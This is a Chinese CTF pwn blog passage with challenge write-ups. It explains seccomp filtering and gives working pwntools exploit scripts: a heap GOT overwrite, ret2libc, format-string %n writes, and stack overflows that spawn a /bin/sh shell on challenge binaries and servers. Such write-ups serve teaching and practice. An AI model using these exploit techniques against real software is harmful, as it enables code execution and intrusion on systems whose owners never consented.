alt="image-20210913162407923"></p><p>可以看到调用了一个新的函数<code>prctl()</code>. 具体的<a href="https://www.man7.org/linux/man-pages/man2/prctl.2.html">LInux Man Page</a>和<a href="https://code.woboq.org/userspace/include/linux/prctl.h.html">option使用的宏定义</a>在此</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure><p>对于第一个<code>prctl()</code>, 38就是<code>PR_SET_NO_NEW_PRIVS</code>, 因此可以查到作用是: </p><blockquote><p>set the calling thread’s no_new_privs attribute to thevalue in <em>arg2</em>. With no_new_privs set to 1, execve(2)<br>promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (for<br>example,rendering the set-user-ID and set-group-ID modebits,and file capabilities non-functional). Once set,the no_new_privs attribute cannot be unset. </p></blockquote><p>简单来说就是禁用<code>execve()</code>函数以及使用到<code>execve()</code>的其他函数</p><p>对于第二个<code>prctl()</code>, 22就是<code>PR_SET_SECCOMP</code>, 查到的作用是:</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.</p><p>With arg2 set to <strong>SECCOMP_MODE_STRICT</strong>(equals 1),the only systemcalls that the thread is permitted to make are <code>read</code>(2)，<code>write</code>(2)，<code>_exit</code>(2)(but not exit_group(2)), and <code>sigreturn</code>(2). Other system calls result in the deliveryof a <code>SIGKILL</code> signal. </p><p>With arg2 set to <strong>SECCOMP_MODE_FILTER</strong>(equals 2)(since Linux 3.5)，the system calls allowed are defined by a pointer to aBerkeley Packet Filter passed in arg3. <em>This argument is apointer to struct sock_fprog</em>; it can be designed to filterarbitrary system calls and system call arguments. </p></blockquote><p>如果选了SECCOMP_MODE_FILTER:</p><p>我们先解释一些原理, 一些示例网站在此 (<a href="https://blog.csdn.net/u013250169/article/details/115669655">seccomp1</a>) (<a href="https://www.jianshu.com/p/75e157cea215">seccomp2</a>) (<a href="https://linux.cn/article-9507-1.html">BPF介绍</a>) (<a href="https://www.cnblogs.com/honpey/p/8013073.html">BPF指令集</a>):</p><ul><li>两个关键struct:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Filter block */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span> <br>   __u16 code; <span class="hljs-comment">/* Actual filter code */</span> <br>   __u8 jt; <span class="hljs-comment">/* Jump true */</span><br>   __u8 jf; <span class="hljs-comment">/* Jump false */</span><br>   __u32 k; <span class="hljs-comment">/* Generic multiuse field */</span> <br>  <br>&#125;; <br><span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span> <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> len; <span class="hljs-comment">/* Number of filter blocks */</span> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><ol><li>code变量涉及到了BPF这种技术, 而seccomp技术就是借鉴BPF的源码, 所以可以到BPF的指令集中找到这个变量的组合方式, 用一些神奇的手段把一些instructions编码进u16中. </li><li>jt和jf的意思较为明显, 就是jump if true||false</li><li>k装啥都行</li></ol><ul><li>作用原理:</li></ul><blockquote><p>每个系统调用都会陷入系统调用控制函数syscall_trace_enter中，该函数中调用了secure_computing，系统调用号作为参数传递。在__secure_computing函数中，通过current-&gt;seccomp.mode提取标志位mode，如果mode为1或者2，则说明当前进程已经设置了seccomp限制。如果是1(<strong>SECCOMP_MODE_STRICT</strong>)则就只允许四个系统调用, 如果是2(<strong>SECCOMP_MODE_FILTER</strong>)就如上面所示</p></blockquote><ul><li>效果: 就是自己设定每一条系统调用所对应的处理方法, 查询方式可以使用下面的工具, 自己设置可以小部分参考→<a href="https://blog.csdn.net/u013250169/article/details/115669655">这里</a>.</li></ul><p><strong>seccomp-tools</strong>用法:(<a href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011这个就是左边的标号<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #有任何一个不允许的系统调用出现时就反回errornumber<br></code></pre></div></td></tr></table></figure><h2 id="19-babyfengshui-33c3-2016"><a href="#19-babyfengshui-33c3-2016" class="headerlink" title="19.babyfengshui_33c3_2016"></a>19.babyfengshui_33c3_2016</h2><blockquote><p>在<a href="./glibc_malloc_srcCode.md#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0">源代码分析</a>中的关键函数部分提到过从几个功能函数推断出存储的结构体, 这次我没注意到这个细节, 属实是hacknote这题直接源码看一遍草草了事, 一些细节给我忽略了.</p><p>善用<code>gdb.attach()</code>, 说实话这样子看堆的结构是最为直观的, 但是我又大意了, 环境和服务器的不一样也不能直接用</p><p>还有一件事, 可以把一些自动生成的名称改一下, 这样子更好看源代码</p></blockquote><p>这题认认真真的分析了一遍源代码, 又花了将近一天的时间, 我也不知道为啥会这么慢</p><ol><li>首先从add函数中看出存数据的结构体是长这个样子的</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span>//总共<span class="hljs-title">user_data</span>区有0<span class="hljs-title">x80</span>字节</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * description;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">0x7c</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>​    而且先malloc description的size(用户输入)字节, 然后再malloc user的0x80字节<br>2. delete和display没有什么特别的, 稍微看一下就可以看出add中count变量(当然是自己改的名字)<br>3. 然后update有个很蠢的检验方法, 主要是他想着user和description是相邻的而且顺序也是一样的, 这样的话我们就可以使用没有tcache的glibc版本来绕过</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="hljs-keyword">char</span> *)*(&amp;ptr + a1) - <span class="hljs-number">4</span> )<br></code></pre></div></td></tr></table></figure><ol start="4"><li>先申请三个chunk, 第三个存”/bin/sh”</li><li>将free_got 地址覆盖在chunk 1的description指针上, 通过display函数打印出来</li><li>通过LibcSearcher找出sys_addr</li><li>改写chunk 1 的description内容为sys_addr, 实际上就是改写free_got为sys_addr</li><li>调用delete(1)即可</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#from pwn import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#context.binary = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;babyfengshui_33c3_2016&quot;</span>)<br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>free_plt = elf.plt[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-comment">#c = 0</span><br><span class="hljs-comment">#if c == 0:</span><br><span class="hljs-comment">#    p = remote(&quot;node4.buuoj.cn&quot;, 26834)</span><br><span class="hljs-comment">#else:</span><br><span class="hljs-comment">#    p = process(&quot;./babyfengshui_33c3_2016&quot;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,name,length,text</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">index,length,text</span>):</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">0x19c</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x198</span>+p32(free_got))<br><br>display(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>, free_addr)<br>base = free_addr - libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>update(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p32(system_addr))<br>delete(<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="20-xdctf2015-pwn200"><a href="#20-xdctf2015-pwn200" class="headerlink" title="20.xdctf2015_pwn200"></a>20.xdctf2015_pwn200</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;bof&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span><br>payload += flat([elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>write_addr = u32(rn(<span class="hljs-number">4</span>)[:])<br><br>base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <span class="hljs-comment">#就是这里只能用bytes类型, 其他没什么可注意的了</span><br><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>, sys_addr, elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], binsh])<br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="21-inndy-rop"><a href="#21-inndy-rop" class="headerlink" title="21.inndy_rop"></a>21.inndy_rop</h2><p>这题非常之直接, 静态链接+数组定义gets函数, 摆明了就是利用ROP</p><p>但是ROP比较长, 直接使用<code>ROPgadget --binary rop --ropchain</code>让它自动生成exploit</p><p>复制粘贴, 然后完事了………</p><p>唯一要注意的就是自动生成的是python2的语法, 如果有什么str类型的数据要把他变成bytes</p><h2 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: 攻防世界新手区pwn题解</title>
    <link href="/2021-07/pwn-start-ctf-pwn2/"/>
    <url>/2021-07/pwn-start-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-攻防世界新手区pwn题解"><a href="#pwn-攻防世界新手区pwn题解" class="headerlink" title="pwn: 攻防世界新手区pwn题解"></a>pwn: 攻防世界新手区pwn题解</h1><p>Adworld的新手区水题记录。 </p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>没什么好说的。直接remote或者nc连上去就可以了。</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-找漏洞"><a href="#2-2-找漏洞" class="headerlink" title="2.2 找漏洞"></a>2.2 找漏洞</h3><p>IDA打开main函数。</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>可以看出<code>printf(&amp;s);</code>是明显的格式化字符串漏洞。</p><p>IDA mov 从右往左.</p><p>pwnme的地址：0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>看清楚, 压入的是format字符串的地址!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-脚本"><a href="#2-3-脚本" class="headerlink" title="2.3 脚本"></a>2.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span> <span class="hljs-comment">#这个10是自己试出来的</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-找漏洞"><a href="#3-2-找漏洞" class="headerlink" title="3.2 找漏洞"></a>3.2 找漏洞</h3><p>IDA64打开。</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>很明显，第一个输入的数字不能是1926（Excited!)</p><p>然后通过gets把他变成1926（Naive!）</p><h3 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-找漏洞"><a href="#4-2-找漏洞" class="headerlink" title="4.2 找漏洞"></a>4.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>逻辑很简单，在<code>unk_601068</code>读入一个值，让<code>dword_60106c</code>变为<code>1853186401</code>即可。</p><h3 id="4-3-脚本"><a href="#4-3-脚本" class="headerlink" title="4.3 脚本"></a>4.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;转换成16进制就是八位数了, 可以p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-找漏洞"><a href="#5-2-找漏洞" class="headerlink" title="5.2 找漏洞"></a>5.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>这里好像有个什么东西嘛…</p><h3 id="5-3-脚本"><a href="#5-3-脚本" class="headerlink" title="5.3 脚本"></a>5.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystem的地址, 简单的read栈溢出</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-找漏洞"><a href="#6-2-找漏洞" class="headerlink" title="6.2 找漏洞"></a>6.2 找漏洞</h3><p>system函数！</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>溢出地址0x8c，返回地址填plt的system地址，参数填/bin/sh的地址。奥利给！</p><p>ps. 会了才知道为什么洛神会这么简洁…..|ू･ω･` )</p><h3 id="6-3-脚本"><a href="#6-3-脚本" class="headerlink" title="6.3 脚本"></a>6.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#空4字节是system函数的返回地址</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-找漏洞"><a href="#7-2-找漏洞" class="headerlink" title="7.2 找漏洞"></a>7.2 找漏洞</h3><p>猜数字，先生成了个随机数，然后猜9次。猜对了给flag。</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>很显然，只要通过get函数把随机种子改成自己想要的就行了。</p><p>先写个脚本看看随机种子是0的情况：</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>写脚本吧。字符串长度为0x30-0x10=0x20。偏移值后面加个0就行。</p><h3 id="7-3-脚本"><a href="#7-3-脚本" class="headerlink" title="7.3 脚本"></a>7.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafter的参数就是字符串</span><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-找漏洞"><a href="#8-2-找漏洞" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>先进这个函数。</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>显而易见嘛。(?)</p><p>再进check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />可以看到__int8, 只有0-255, 而且有要求密码长4-8, 